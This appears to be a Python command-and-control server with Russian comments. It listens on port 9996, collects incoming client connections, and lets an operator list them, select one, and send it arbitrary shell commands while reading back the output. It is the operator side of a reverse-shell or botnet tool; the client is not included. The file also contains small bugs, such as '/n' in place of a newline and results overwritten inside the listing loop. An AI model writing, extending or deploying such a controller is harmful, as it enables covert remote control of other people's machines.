import socket, time, sys
import threading
from queue import Queue


#-------------------------------------------------------------------------
# Два потока: Один ждет новых подключений(1); Другой отправляет команды(2)
#-------------------------------------------------------------------------

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue() 
all_connections = []
all_adress = []


#----------------
# Создание сокета
#----------------

def create_socket():

	try:
		global host
		global port
		global s

		host = ''
		port = 9996
		s = socket.socket()

	except socket.error as msg:
		print("Socket creation error" + str(msg))


#-----------------------------------
# Подключение и прослушивание сокета
#-----------------------------------

def bind_socket():

	try:
		global host
		global port
		global s
		print("Binding the port: " + str(port))

		s.bind((host, port))
		s.listen(5)

	except socket.error as msg:
		print("Socket Binding error" + str(msg) + "\n" + 'Retrying...')
		bind_socket()


#--------------------------------------------------------------------------
# Отключение предидущих соединений, при перезагрузке файла socket_server.py
# Поиск все-возможных клиентов и сохраниение их в лист
#--------------------------------------------------------------------------

def accepting_connection():

	# Закрываем все открытые сокеты
	for c in all_connections:
		c.close()

	del all_connections[:]
	del all_adress[:]

	# Ожидание новых подключений
	while True:
		try:
			conn, address = s.accept()
			s.setblocking(1) # Предотвращение timeout

			all_connections.append(conn)
			all_adress.append(address)

			print("Connection has been established: " + address[0])

		except:
			print("Error accepting connections")


#-------------------------------------------------
# Функции второго (2) потока:
# 1) Просмотр всех подключенных клиентов к серверу
# 2) Выбор клиента
# 3) Отправка команды клиенту
#-------------------------------------------------

#--------------------------------------------------
# Выбор нужного клиента ( list or select <number> )
#--------------------------------------------------

def start_turtle():

	while True:
		cmd = input('server> ')

		if cmd == 'list':
			list_connections()

		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		else:
			print('Command not recognized')


#-----------------------------------------------------------
# Отображение всех активных клиентов, подключенных к серверу
#-----------------------------------------------------------

def list_connections():

	results = ''

	for i,conn in enumerate(all_connections):
		# Смотрим подключено ли устройство или отключено
		try:
			conn.send(str.encode(' '))
			conn.recv(201480)

		except:
			del all_connections[i]
			del all_adress[i]
			continue

		results = str(i) + "  " + str(all_adress[i][0]) + "  " + str(all_adress[i][1]) + '/n'

	print("---- Clients ----" + '\n' + results)


#--------------------------
# Выбор клиента по targetId
#--------------------------

def get_target(cmd):

	try:
		target = cmd.replace('select ', '') #target = id
		target = int(target)
		conn = all_connections[target]
		print('Your are now connected to :' + str(all_adress[target][0]))
		print(str(all_adress[target][0]) + '>', end='') # 192.168.0.1> <command>
		return conn

	except:
		print("Selection not valid")
		return None


#--------------------------------------
# Отправление команд выбранному клиенту
#--------------------------------------

def send_target_commands(conn):

	while True:
		try:
			cmd = input()
			if cmd == 'quit':
				break

			# Отправляем команды и ждем ответа от клиентов
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480), 'utf-8')
				print(client_response, end='')

		except:
			print('Error sending commands')
			break


#-----------------
# Создание потоков
#-----------------

def create_workers():

	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()


#-------------------------------------------------------------------------
# Выполнение команд, находящихся в очереди (подключение и отправка команд)
#-------------------------------------------------------------------------

def work():

	while True:
		x = queue.get()

		if x == 1:
			create_socket()
			bind_socket()
			accepting_connection()

		if x == 2:
			start_turtle()

		queue.task_done()


def create_jobs():

	for x in JOB_NUMBER:
		queue.put(x)

	queue.join()


create_workers()
create_jobs()